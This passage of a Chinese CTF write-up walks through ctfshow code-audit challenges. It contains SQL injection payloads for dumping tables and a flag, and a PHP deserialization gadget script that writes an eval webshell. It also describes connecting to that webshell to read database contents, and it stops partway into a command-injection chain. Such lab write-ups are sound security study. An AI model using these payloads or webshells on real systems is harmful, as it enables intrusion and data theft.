+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">查表名
+</span></span><span class="line"><span class="cl">dpt_name=1&#39;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">查字段
+</span></span><span class="line"><span class="cl">dpt_name=1&#39;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#39;sds_fl9g&#39;);#
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">查值
+</span></span><span class="line"><span class="cl">dpt_name=1&#39;,sds_address=(select flag from sds_fl9g)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128152931496.png"
+	width="803"
+	height="75"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128152931496_hu6634948544753485564.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128152931496_hu3192670530740682288.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128152931496"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1070"
+		data-flex-basis="2569px"
+	
+></p>
+<p>也可以用报错注入，这里直接带过了</p>
+<h2 id="web304">Web304
+</h2><h3 id="知识点同上">知识点：同上
+</h3><p>说是上了waf但是估计忘记上环境了，反正sqlmap还是照样跑的出来。这里直接跳过了</p>
+<h2 id="web305">Web305
+</h2><h3 id="知识点项目反序列化写马">知识点：项目反序列化写马
+</h3><p>项目结构还是相同，一眼看到发序列化，并且触发点在cookie</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128155933867.png"
+	width="1286"
+	height="916"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128155933867_hu9775255314903359551.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128155933867_hu9423858415219595534.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128155933867"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="140"
+		data-flex-basis="336px"
+	
+></p>
+<p>去看看class.php的逻辑</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128160042603.png"
+	width="1113"
+	height="673"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128160042603_hu13128512062721141703.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128160042603_hu4478873059175313312.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128160042603"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="396px"
+	
+></p>
+<p>简单，直接传马上去，本地测试成功</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128163042773.png"
+	width="1496"
+	height="565"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128163042773_hu5464357805325407855.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128163042773_hu12077520952202169081.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128163042773"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="635px"
+	
+></p>
+<p>别穿错路由了。。。。。。（）</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164040602.png"
+	width="1999"
+	height="694"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164040602_hu10835131144714791758.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164040602_hu12501544646723165643.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128164040602"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="691px"
+	
+></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164001215.png"
+	width="1061"
+	height="742"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164001215_hu3610203222235116608.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164001215_hu2828117787447666177.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128164001215"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="343px"
+	
+></p>
+<p>没找到flag，连蚁剑去数据库里找，记得不能连https</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164702549.png"
+	width="653"
+	height="396"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164702549_hu6552098991304838692.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164702549_hu11602546306627091463.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128164702549"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="395px"
+	
+></p>
+<p>要看蚁剑里的<code>conn.php</code>中的数据库信息</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164919525.png"
+	width="517"
+	height="453"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164919525_hu280431501843555187.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128164919525_hu5660241296270785076.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128164919525"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="114"
+		data-flex-basis="273px"
+	
+></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128165104586.png"
+	width="802"
+	height="416"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128165104586_hu16802725774421161320.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128165104586_hu3498672519378255914.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128165104586"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="462px"
+	
+></p>
+<p>也是第一次知道蚁剑可以直接管理数据库</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128165129169.png"
+	width="1254"
+	height="590"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128165129169_hu7770631796175811493.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251128165129169_hu15231295561048490541.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251128165129169"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+></p>
+<h2 id="web306">Web306
+</h2><h3 id="知识点构造反序列化链写马">知识点：构造反序列化链写马
+</h3><p>开始使用mvc架构</p>
+<p>项目结构如下</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130143235122.png"
+	width="310"
+	height="830"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130143235122_hu12229829391069690256.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130143235122_hu11033407004246118347.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251130143235122"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="37"
+		data-flex-basis="89px"
+	
+></p>
+<p><strong>MVC</strong>（<strong>Model-View-Controller</strong>）模式是一种广泛应用于软件开发中的架构模式，特别是在用户界面的设计中。它将应用程序分为三个核心部分：<strong>模型</strong>（Model）、<strong>视图</strong>（View）和<strong>控制器</strong>（Controller），实现了关注点的分离，即将数据的管理、用户界面和控制逻辑分离开来。</p>
+<p>在<code>index.php</code>中找到反序列化的点</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205101124899.png"
+	width="852"
+	height="341"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205101124899_hu11713330055368368561.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205101124899_hu202100578827657092.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205101124899"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="599px"
+	
+></p>
+<p>看一下<code>checklogin.php</code>。很明显，把登录的功能搞到了<code>service</code>类中</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130152059193.png"
+	width="1048"
+	height="464"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130152059193_hu15960224593801499982.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130152059193_hu16878551303626122390.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251130152059193"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="542px"
+	
+></p>
+<p>那么接下来跟进看看<code>service</code>类的代码逻辑，包含了两个文件，然后在<code>dao.php</code>是用于查询用户名对应的密码，然后如果查询对了的话就创建新的user对象。这个user对象就是反序列化的利用点</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130152955045.png"
+	width="1119"
+	height="451"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130152955045_hu12931802523932843192.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130152955045_hu17799588445951580907.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251130152955045"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p>接下来去看看<code>dao.php</code>的逻辑</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130154228932.png"
+	width="2090"
+	height="800"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130154228932_hu10159972897786621575.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130154228932_hu5873078539669465287.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251130154228932"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="261"
+		data-flex-basis="627px"
+	
+></p>
+<p>这里明显存在sql注入，还是没过滤的那种，不过因为<code>checklogin.php</code>还存在用户名长度限制，所以这里sql注入其实是没有作用的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">get_user_password_by_username</span><span class="p">(</span><span class="nv">$u</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;select sds_password from sds_user where sds_username=&#39;&#34;</span><span class="o">.</span><span class="nv">$u</span><span class="o">.</span><span class="s2">&#34;&#39; order by id limit 1;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$result</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$row</span><span class="o">=</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">(</span><span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;sds_password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实漏洞点这个<code>destruct</code>这里很明显是调用了<code>close</code>函数</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130155603199.png"
+	width="579"
+	height="92"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130155603199_hu16661760896071748166.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251130155603199_hu15623053701032634119.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251130155603199"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="629"
+		data-flex-basis="1510px"
+	
+></p>
+<p>然后再<code>class.php</code>的<code>log</code>类中也有很明显的close方法，而且直接可以利用</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205102253578.png"
+	width="832"
+	height="927"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205102253578_hu15980245755457525327.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205102253578_hu5627400428054184951.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205102253578"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="89"
+		data-flex-basis="215px"
+	
+></p>
+<p>写个脚本，这里要注意的就是<code>conn</code>这个成员赋值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">dao</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$conn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">log</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">log</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$title</span><span class="o">=</span><span class="s1">&#39;a.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$info</span><span class="o">=</span><span class="s1">&#39;&lt;?php @eval($_POST[\&#39;a\&#39;]);?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">title</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">info</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">dao</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">((</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205152414510.png"
+	width="1004"
+	height="873"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205152414510_hu8425580724745415501.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205152414510_hu6202610249149231175.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205152414510"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="276px"
+	
+></p>
+<p>这里稍微解释一下利用链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">首先是被利用的点
+</span></span><span class="line"><span class="cl">index.php  -&gt; unserialize
+</span></span><span class="line"><span class="cl">     |
+</span></span><span class="line"><span class="cl">     v
+</span></span><span class="line"><span class="cl">dao.php dap类    -&gt;  调用一个close()方法
+</span></span><span class="line"><span class="cl">     |
+</span></span><span class="line"><span class="cl">     v
+</span></span><span class="line"><span class="cl">class.php log类   -&gt;  close类存在文件上传函数
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>另外我发现一个很有趣的事情，当我的木马密码为数字的时候就会出错误</p>
+<p><img src="/image-20251205151422722.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251205151422722"
+	
+	
+></p>
+<p>这种时候写进去的马也无法连接</p>
+<p>只有木马为字母的时候才会报<code>200</code>。也许和这个log类有关系</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205153507501.png"
+	width="1612"
+	height="702"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205153507501_hu11171926125992421163.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205153507501_hu11438857004713131788.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205153507501"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="551px"
+	
+></p>
+<p>蚁剑连接后，在当前目录找到，我还以为又在数据库呢</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205153828083.png"
+	width="1114"
+	height="771"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205153828083_hu4428933083367484419.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205153828083_hu10362065707527120634.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205153828083"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="144"
+		data-flex-basis="346px"
+	
+></p>
+<h2 id="web307">Web307
+</h2><h3 id="知识点项目反序列化链命令注入">知识点：项目反序列化链命令注入
+</h3><p>项目结构</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205154705281.png"
+	width="274"
+	height="745"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205154705281_hu3076924809308708256.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205154705281_hu13817077283573126533.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205154705281"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="36"
+		data-flex-basis="88px"
+	
+></p>
+<p>多了一个<code>controller</code>更像<code>mvc</code>架构了，后续审java代码的话，这个还是挺有帮助的</p>
+<p><code>index.php</code>没发现啥在<code>login.php</code>发现注入点</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205170640091.png"
+	width="883"
+	height="278"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205170640091_hu4471802610207852283.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205170640091_hu17532183724511546360.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205170640091"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="762px"
+	
+></p>
+<p>然后注意到包含了这个<code>service.php</code>直接去看一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">require &#39;controller/service/service.php&#39;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>很明显可以看到两个熟的不能再熟的魔术方法，接下来就去看看<code>config</code>类和<code>dao</code>类</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205173423268.png"
+	width="965"
+	height="1048"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205173423268_hu13317345132164568608.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205173423268_hu14699240228937229819.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205173423268"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="92"
+		data-flex-basis="220px"
+	
+></p>
+<p><code>config.php</code>没啥东西</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205173925156.png"
+	width="488"
+	height="865"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205173925156_hu8524074265376669921.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251205173925156_hu1976524918899299578.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205173925156"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="56"
+		data-flex-basis="135px"
+	
+></p>
+<p><code>dao.php</code>这里还是有这个经典的魔术方法，不过<code>class.php</code>中的<code>close</code>方法已经改成了<code>closelog</code>，所以这里是走不通了</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206171236060.png"
+	width="1269"
+	height="811"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206171236060_hu9497019304794547092.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206171236060_hu18239487090150412128.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251206171236060"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="375px"
+	
+></p>
+<p><code>dao.php</code>中还看到了这个可以命令注入的点，说不定这里就是攻击的地方</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206171444129.png"
+	width="905"
+	height="258"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206171444129_hu16678874792089046065.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206171444129_hu15188704673077629382.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251206171444129"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="350"
+		data-flex-basis="841px"
+	
+></p>
+<p>这里<code>config</code>在构造函数里定义了是<code>config</code>类的对象，所以拼接的是config类的<code>cache_dir</code>成员</p>
+<p>问题是，怎么触发这个函数呢？在Seay里有一个全局搜索，我们搜索一下<code>clearCache()</code>这个函数。可以发现除了<code>service.php</code>和<code>dao.php</code>还有一个<code>login.php</code>存在<code>clearCache()</code></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206173517625.png"
+	width="874"
+	height="168"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206173517625_hu11286498516417237190.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206173517625_hu15216096917951879947.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251206173517625"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="520"
+		data-flex-basis="1248px"
+	
+></p>
+<p>跟进看看，看来这里才是利用点，那么就很好解决了</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206173647164.png"
+	width="1096"
+	height="413"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206173647164_hu7237718501553478548.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251206173647164_hu9483530930875401484.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251206173647164"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="636px"
+	
+></p>
+<p>我们构造脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">dao</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$conn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">=</span><span class="k">new</span> <span class="nx">config</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
